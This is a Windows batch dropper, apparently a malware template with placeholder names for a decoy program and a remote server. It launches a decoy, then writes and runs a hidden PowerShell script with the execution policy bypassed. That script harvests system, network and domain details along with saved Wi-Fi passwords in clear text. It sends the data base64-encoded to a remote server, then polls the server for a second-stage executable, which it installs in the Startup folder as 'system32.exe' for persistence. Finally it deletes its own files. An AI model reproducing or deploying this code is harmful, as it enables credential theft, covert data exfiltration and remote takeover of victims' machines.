@echo off

cd %APPDATA%
decoyProgDownload
start decoyProgName
echo $StageId = IDstage1 > stage1.ps1
echo $UserName = $env:UserName >> stage1.ps1
echo $ComputerName = $env:ComputerName >> stage1.ps1
echo $PublicIp = (Invoke-WebRequest -Uri "http://ifconfig.me/ip").Content >> stage1.ps1
echo $SystemInfo = systeminfo >> stage1.ps1
echo $Whoami = whoami /all >> stage1.ps1
echo $IpConfig = ipconfig /all >> stage1.ps1
echo $NetStat = netstat -ano >> stage1.ps1
echo $ListAccounts = net accounts >> stage1.ps1
echo $NetShare = net share >> stage1.ps1
echo $NetView = net view /all >> stage1.ps1
echo $ListDomain = net view /domain /all >> stage1.ps1
echo $ListProcess = Get-Process >> stage1.ps1
echo $WindowsUpdate = Get-Hotfix >> stage1.ps1
echo $WirelessSSIDs = (netsh wlan show profiles ^| Select-String ': ' ) -replace ".*:\s+" >> stage1.ps1
echo $WifiInfo = foreach($i in $WirelessSSIDs) { >> stage1.ps1
echo $Password = (netsh wlan show profiles name=$i key=clear ^| Select-String 'Conten') -replace ".*:\s+" >> stage1.ps1
echo New-Object -TypeName psobject -Property @{"SSID"=$i;"Password"=$Password} >> stage1.ps1
echo } >> stage1.ps1
echo $WiFiPwd = $WifiInfo ^| ConvertTo-Json >> stage1.ps1
echo $DataEncode = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes( >> stage1.ps1
echo "UserName : "        + $UserName      + "`n`n" + >> stage1.ps1
echo "ComputerName : "    + $ComputerName  + "`n`n" + >> stage1.ps1
echo "PublicIp : "        + $PublicIp      + "`n`n" + >> stage1.ps1
echo "SystemInfo : `n"    + $SystemInfo    + "`n`n" + >> stage1.ps1
echo "Whoami : `n"        + $Whoami        + "`n`n" + >> stage1.ps1
echo "IpConfig : `n"      + $IpConfig      + "`n`n" + >> stage1.ps1
echo "NetStat : `n"       + $NetStat       + "`n`n" + >> stage1.ps1
echo "ListAccounts : `n"  + $ListAccounts  + "`n`n" + >> stage1.ps1
echo "NetShare : `n"      + $NetShare      + "`n`n" + >> stage1.ps1
echo "NetView : `n"       + $NetView       + "`n`n" + >> stage1.ps1
echo "ListDomain : `n"    + $ListDomain    + "`n`n" + >> stage1.ps1
echo "ListProcess : `n"   + $ListProcess   + "`n`n" + >> stage1.ps1
echo "WindowsUpdate : `n" + $WindowsUpdate + "`n`n" + >> stage1.ps1
echo "WiFiPwd : `n"       + $WiFiPwd >> stage1.ps1
echo )) >> stage1.ps1
echo $separator = "A" >> stage1.ps1
echo $DataEncodeSegment = $DataEncode.Split($separator) >> stage1.ps1
echo $date = Get-Date -Format "dddd_dd/MM/yyyy_HH:mm" >> stage1.ps1
echo (New-Object System.Net.WebClient).DownloadString('remoteHTTPserver/?send=' + $StageId + '^|' + $date + '^|') >> stage1.ps1
echo foreach($i in $DataEncodeSegment){ >> stage1.ps1
echo (New-Object System.Net.WebClient).DownloadString('remoteHTTPserver/?send=' + $i) >> stage1.ps1
echo } >> stage1.ps1
echo while($true){ >> stage1.ps1
echo $stage2 = (New-Object System.Net.WebClient).DownloadString('remoteHTTPserver/?id=' + $StageId) >> stage1.ps1
echo if($stage2 -like 'http*'){ >> stage1.ps1
echo (New-Object System.Net.WebClient).DownloadFile($stage2, "$env:TEMP\system32.exe") >> stage1.ps1
echo Copy-Item "$env:TEMP\system32.exe" -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system32.exe" >> stage1.ps1
echo start "$env:TEMP\system32.exe" >> stage1.ps1
echo Exit >> stage1.ps1
echo } else { >> stage1.ps1
echo Start-Sleep -s 60 >> stage1.ps1
echo } >> stage1.ps1
echo } >> stage1.ps1
powershell -W Hidden -Exec Bypass -File .\stage1.ps1
del %APPDATA%\stage1.ps1
del %APPDATA%\decoyProgName